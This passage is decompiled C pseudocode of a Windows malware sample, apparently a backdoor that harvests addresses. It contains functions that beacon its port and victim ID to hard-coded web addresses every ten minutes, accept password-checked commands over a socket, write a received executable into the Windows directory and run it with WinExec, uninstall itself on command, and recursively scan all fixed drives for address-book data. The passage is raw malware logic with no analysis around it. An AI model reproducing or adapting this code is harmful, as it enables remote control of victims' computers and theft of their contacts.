          UnmapViewOfFile(v6);
        }
        CloseHandle(v4);
      }
    }
    result = CloseHandle(hFile);
  }
  return result;
}

//----- (00402ADD) --------------------------------------------------------
CHAR *sub_402ADD()
{
  CHAR *result; // eax

  sub_401524(&dword_40814A, 5000);
  result = &byte_40814E;
  byte_40814E = 0;
  return result;
}

//----- (00402AF6) --------------------------------------------------------
int __stdcall sub_402AF6(PCSTR pszFirst)
{
  const char *v1; // edi
  const CHAR *v2; // edx

  v1 = pszSrch;
  do
  {
    v2 = v1;
    v1 += strlen(v1) + 1;
    if ( StrStrIA(pszFirst, v2) )
      return 0;
  }
  while ( *v1 );
  return 1;
}

//----- (00402B2C) --------------------------------------------------------
LPSTR __stdcall sub_402B2C(LPCSTR lpString2)
{
  LPSTR result; // eax
  unsigned int v2; // eax

  result = (LPSTR)sub_402AF6(lpString2);
  if ( result )
  {
    v2 = sub_4014F3(lpString2);
    result = (LPSTR)sub_40153E(&dword_40814A, 0x1388u, v2);
    if ( result )
    {
      if ( byte_40814E )
        sub_402465(&byte_40814E, lpString2);
      else
        sub_402465(lpString2, lpString2);
      result = lstrcpyA(&byte_40814E, lpString2);
    }
  }
  return result;
}

//----- (00402B8F) --------------------------------------------------------
PSTR __stdcall sub_402B8F(PCSTR pszFirst)
{
  const char *v1; // edi
  const CHAR *v2; // edx
  PSTR result; // eax

  v1 = aWab;
  while ( 1 )
  {
    v2 = v1;
    v1 += strlen(v1) + 1;
    result = StrStrIA(pszFirst, v2);
    if ( result )
      break;
    if ( !*v1 )
      return result;
  }
  return (PSTR)sub_402A5A(pszFirst, (int)sub_402B2C);
}

//----- (00402BCB) --------------------------------------------------------
HLOCAL __stdcall sub_402BCB(LPCSTR lpString, int a2)
{
  int v2; // edi
  LPWIN32_FIND_DATAA lpFindFileData; // [esp+4h] [ebp-Ch]
  HLOCAL hMem; // [esp+8h] [ebp-8h]
  HANDLE hFindFile; // [esp+Ch] [ebp-4h]

  hMem = LocalAlloc(0, 0x400u);
  lpFindFileData = (LPWIN32_FIND_DATAA)LocalAlloc(0, 0x13Eu);
  v2 = lstrlenA(lpString);
  lstrcatA((LPSTR)lpString, asc_4057E7);
  hFindFile = FindFirstFileA(lpString, lpFindFileData);
  if ( hFindFile != (HANDLE)-1 )
  {
    do
    {
      lpString[v2] = 0;
      if ( *(_WORD *)lpFindFileData->cFileName != 46 && *(_WORD *)lpFindFileData->cFileName != 11822 )
      {
        lstrcatA((LPSTR)lpString, lpFindFileData->cFileName);
        if ( (lpFindFileData->dwFileAttributes & 0x10) != 0 )
        {
          lstrcatA((LPSTR)lpString, &asc_4057E3[2]);
          sub_402BCB(lpString, a2);
        }
        else
        {
          sub_402B8F(lpString);
        }
      }
      Sleep(1u);
    }
    while ( FindNextFileA(hFindFile, lpFindFileData) );
    FindClose(hFindFile);
  }
  LocalFree(hMem);
  return LocalFree(lpFindFileData);
}

//----- (00402C9D) --------------------------------------------------------
HGLOBAL __stdcall sub_402C9D(LPCSTR lpString2)
{
  const CHAR *v1; // eax
  CHAR *hMem; // [esp+0h] [ebp-4h]

  hMem = (CHAR *)GlobalAlloc(0x40u, 0x10000u);
  v1 = lstrcpyA(hMem, lpString2);
  sub_402BCB(v1, (int)v1);
  return GlobalFree(hMem);
}

//----- (00402CCE) --------------------------------------------------------
HGLOBAL sub_402CCE()
{
  const CHAR *i; // esi
  CHAR *lpBuffer; // [esp+8h] [ebp-4h]

  lpBuffer = (CHAR *)GlobalAlloc(0x40u, 0x2000u);
  GetLogicalDriveStringsA(0x1FFFu, lpBuffer);
  for ( i = lpBuffer; *i; i += lstrlenA(i) + 1 )
  {
    if ( GetDriveTypeA(i) == 3 )
      sub_402C9D(i);
  }
  return GlobalFree(lpBuffer);
}

//----- (00402D22) --------------------------------------------------------
BOOL sub_402D22()
{
  BOOL result; // eax

  while ( 1 )
  {
    result = InternetGetConnectedState(0, 0);
    if ( result )
      break;
    Sleep(0x7D0u);
  }
  return result;
}

//----- (00402D3D) --------------------------------------------------------
void *__stdcall sub_402D3D(const char *a1)
{
  void *v1; // ebx
  CHAR *v3; // [esp+6Ch] [ebp-8h]
  void *hInternet; // [esp+70h] [ebp-4h]

  v3 = (CHAR *)GlobalAlloc(0x40u, 0x400u);
  wsprintfA(v3, "%s?p=%lu&id=%s", a1, dword_405003, (const char *)Data);
  sub_402D22();
  hInternet = InternetOpenA(szAgent, 1u, 0, 0, 0);
  v1 = InternetOpenUrlA(hInternet, v3, 0, 0, 0x40000000u, 0);
  if ( v1 )
    InternetCloseHandle(v1);
  InternetCloseHandle(hInternet);
  GlobalFree(v3);
  return v1;
}
// 405003: using guessed type int dword_405003;

//----- (00402DC2) --------------------------------------------------------
void *sub_402DC2()
{
  const char *v0; // edi
  const char *v1; // edx
  void *result; // eax

  if ( !sub_401669() )
    sub_401184();
  v0 = aHttpWwwElrassh;
  do
  {
    v1 = v0;
    v0 += strlen(v0) + 1;
    result = sub_402D3D(v1);
  }
  while ( *v0 );
  return result;
}

//----- (00402DED) --------------------------------------------------------
void __stdcall __noreturn sub_402DED(LPVOID lpThreadParameter)
{
  while ( 1 )
  {
    sub_402DC2();
    Sleep(0x927C0u);
  }
}

//----- (00402E07) --------------------------------------------------------
BOOL sub_402E07()
{
  HANDLE v0; // eax
  DWORD ThreadId; // [esp+0h] [ebp-4h] BYREF

  v0 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)sub_402DED, 0, 0, &ThreadId);
  return CloseHandle(v0);
}

//----- (00402E2B) --------------------------------------------------------
int __stdcall sub_402E2B(SOCKET s, int a2)
{
  HANDLE hFile; // [esp+Ch] [ebp-160h]
  DWORD nNumberOfBytesToWrite; // [esp+10h] [ebp-15Ch] BYREF
  int v5; // [esp+14h] [ebp-158h] BYREF
  char v6; // [esp+1Ah] [ebp-152h] BYREF
  CHAR String2[8]; // [esp+1Bh] [ebp-151h] BYREF
  char Buffer[128]; // [esp+23h] [ebp-149h] BYREF
  int String1[50]; // [esp+A3h] [ebp-C9h] BYREF
  char v10; // [esp+16Bh] [ebp-1h]

  WaitForSingleObject(hHandle, 0xFFFFFFFF);
  v10 = 0;
  v6 = 0;
  sub_401000(String2, 8u);
  sub_401481(a2);
  if ( sub_4019CF(s, a2, 1, 5, 0) )
  {
    sub_40146E(a2);
    (*(void (__stdcall **)(int, char *, int, _DWORD))(*(_DWORD *)a2 + 12))(a2, &v6, 1, 0);
    sub_401481(a2);
    if ( v6 == 2 || v6 == 3 || v6 == 4 )
    {
      if ( sub_401A38(s, a2, 200, 0, 5) )
      {
        sub_40146E(a2);
        (*(void (__stdcall **)(int, int *, int, _DWORD))(*(_DWORD *)a2 + 12))(a2, String1, 200, 0);
        sub_401481(a2);
        if ( !lstrcmpiA((LPCSTR)String1, a12) )
        {
          String1[0] = 1;
          String1[1] = dword_405003;
          send(s, (const char *)String1, 8, 0);
          if ( v6 == 2 || v6 == 3 )
          {
            if ( sub_4019CF(s, a2, 4, 4, 0) )
            {
              sub_40146E(a2);
              (*(void (__stdcall **)(int, int *, int, _DWORD))(*(_DWORD *)a2 + 12))(a2, &v5, 4, 0);
              sub_401481(a2);
              if ( sub_4019CF(s, a2, v5, 4, 0) )
              {
                sub_40146E(a2);
                GetWindowsDirectoryA((LPSTR)String1, 0x104u);
                sub_401023(String2, 5);
                lstrcatA((LPSTR)String1, aBsupld);
                lstrcatA((LPSTR)String1, String2);
                lstrcatA((LPSTR)String1, aExe);
                hFile = CreateFileA((LPCSTR)String1, 0x40000000u, 2u, 0, 2u, 0, 0);
                if ( hFile != (HANDLE)-1 )
                {
                  while ( 1 )
                  {
                    (*(void (__stdcall **)(int, char *, int, DWORD *))(*(_DWORD *)a2 + 12))(
                      a2,
                      Buffer,
                      128,
                      &nNumberOfBytesToWrite);
                    if ( !nNumberOfBytesToWrite )
                      break;
                    WriteFile(hFile, Buffer, nNumberOfBytesToWrite, &nNumberOfBytesToWrite, 0);
                  }
                  CloseHandle(hFile);
                  if ( v6 == 3 )
                    lstrcatA((LPSTR)String1, aUpd);
                  WinExec((LPCSTR)String1, 0);
                  if ( v6 == 3 )
                    sub_401184();
                }
              }
            }
          }
          else if ( v6 == 4 )
          {
            sub_401184();
          }
        }
      }
    }
  }
  closesocket(s);
  ReleaseMutex(hHandle);
  return 0;
}
// 405003: using guessed type int dword_405003;

//----- (004030F6) --------------------------------------------------------
int __stdcall sub_4030F6(SOCKET s)
{
  char v2[2]; // [esp+10h] [ebp-Ch] BYREF
  __int16 v3; // [esp+12h] [ebp-Ah]
  LPSTREAM ppstm; // [esp+18h] [ebp-4h] BYREF

  ++dword_405758;
  sub_4013D2(&ppstm);
  sub_4019CF(s, (int)ppstm, 8, 5, 1);
  sub_40146E((int)ppstm);
  sub_401000(v2, 8u);
  ppstm->lpVtbl->Read(ppstm, v2, 8, 0);
  if ( v2[0] == 67 && v2[1] == -1 && v3 == -1 )
    sub_402E2B(s, (int)ppstm);
  else
    closesocket(s);
  sub_4013E5((int)ppstm);
  --dword_405758;
  return 0;
}
// 405758: using guessed type int dword_405758;

//----- (0040318A) --------------------------------------------------------
void __noreturn start()
{
  CoInitialize(0);
  sub_401835();
  if ( !dword_405003 )
    dword_405003 = sub_4012AA(0xAFC8u) + 5000;
  sub_401C78(dword_405003, (int)sub_4030F6, (int)&unk_40575C);
  sub_402E07();
  if ( dword_405754 )
    sub_402CCE();
  while ( 1 )
    Sleep(0x3E8u);
}
// 40318A: using guessed type void __noreturn start();
// 405003: using guessed type int dword_405003;
// 405754: using guessed type int dword_405754;

// nfuncs=142 queued=73 decompiled=73 lumina nreq=0 worse=0 better=0
// ALL OK, 73 function(s) have been successfully decompiled
